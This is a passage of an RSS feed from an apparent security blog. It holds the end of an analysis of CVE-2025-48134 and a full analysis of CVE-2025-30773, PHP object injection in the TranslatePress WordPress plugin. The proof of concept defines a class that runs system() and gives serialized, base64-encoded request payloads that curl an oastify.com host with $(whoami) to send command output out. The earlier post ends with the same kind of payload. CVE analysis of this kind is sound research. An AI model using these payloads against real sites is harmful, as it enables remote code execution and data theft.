administrator_cookie&#xA;...&#xA;shortcode=%22%7B%5Cr%5Cn&amp;#43;&amp;#43;%5C%22shortcode%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22shortcode1%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22meta%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22sp_tab_source_options%5C%22%3A&amp;#43;%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl&amp;#43;http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;%7D%5Cr%5Cn%7D%22&amp;amp;action=tabs_import_shortcode&amp;amp;nonce=b6d5e5977d&amp;amp;unSanitize=&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#39; alt=&#34;Result&#34; height=&#34;578&#34; width=&#34;1136&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-48134 originates from insecure deserialization through &lt;code&gt;maybe_unserialize()&lt;/code&gt; during import, allowing &lt;strong&gt;PHP Object Injection&lt;/strong&gt; and possible RCE if a malicious class exists. Even though Administrator privileges and a valid nonce are required, the impact is still critical. Version 2.2.13 fixes this by preventing arbitrary object creation during unserialization.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Root cause: uncontrolled deserialization of input&lt;/li&gt;&#xA;&lt;li&gt;Impact: Object Injection and Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;Administrator privileges required for exploitation&lt;/li&gt;&#xA;&lt;li&gt;Never unserialize user input without restricting classes or applying safe validation&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-expand-tabs-free/vulnerability/wordpress-wp-tabs-2-2-11-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin &amp;lt;= 2.2.12 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30773 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</link>
      <pubDate>Sun, 23 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30773&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30773&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/translatepress-multilingual/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;TranslatePress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.7&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.9.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trp_update_database(){&#xA;    if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;&#xA;    $nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;    if ( $nonce === false ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;    $extra_params = isset( $_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ))) : array();&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; is called directly on user-supplied data (&lt;code&gt;$_REQUEST[&#39;trp_updb_extra_params&#39;]&lt;/code&gt; after HTML sanitization and Base64 decode). This creates a serious vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No safety validation&lt;/strong&gt;: There is no data validation prior to calling &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If data is invalid or malicious, the system lacks graceful handling, increasing risk.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.9.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#39; alt=&#34;Diff&#34; height=&#34;278&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; is replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;By removing &lt;code&gt;unserialize()&lt;/code&gt;, the vulnerability surface is eliminated entirely.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;trp_update_database()&lt;/code&gt; function checks whether the current user is an Administrator via:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It also verifies a &lt;code&gt;nonce&lt;/code&gt; to prevent CSRF:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;if ( $nonce === false ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;nonce&lt;/code&gt; is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, &lt;code&gt;manage_options&lt;/code&gt; will pass, and backend logic proceeds.&lt;/p&gt;&#xA;&lt;p&gt;Searching for the &lt;code&gt;trp_update_database&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#34; title=&#34;Search result for trp_update_database&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search result for trp_update_database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#39; alt=&#34;Search&#34; height=&#34;537&#34; width=&#34;1260&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search result for trp_update_database&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;trp_update_database&lt;/code&gt; is assigned to the &lt;code&gt;page&lt;/code&gt; parameter, meaning it is the callback invoked when visiting &lt;code&gt;/wp-admin/admin.php?page=trp_update_database&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator visits /wp-admin/admin.php?page=trp_update_database&amp;#34;] --&amp;gt; B[&amp;#34;trp_update_database() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check capability: current_user_can(manage_options)&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; print error: insufficient privilege&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;Verify nonce: wp_verify_nonce()&amp;#34;]&#xA;&#xA;D --&amp;gt;|Fail| Y[&amp;#34;Stop &amp;amp; print error: Invalid nonce&amp;#34;]&#xA;D --&amp;gt;|Pass| E[&amp;#34;Read trp_updb_extra_params&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;unserialize()&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Is payload malicious?&amp;#34;}&#xA;H --&amp;gt;|Yes| R[&amp;#34;Object Injection → Code Execution (RCE)&amp;#34;]&#xA;H --&amp;gt;|No| S[&amp;#34;Continue update process normally&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create test class in &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send request through BurpSuite proxy&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with &lt;code&gt;trp_updb_extra_params&lt;/code&gt; containing a serialized Base64-encoded payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;trp_updb_extra_params = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:75:&amp;#34;curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: administrator_cookie&#xA;...&#xA;&#xA;action=trp_update_database&amp;amp;trp_updb_nonce=808dff22f9&amp;amp;initiate_update=true&amp;amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#34; title=&#34;Output&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#39; alt=&#34;Result&#34; height=&#34;379&#34; 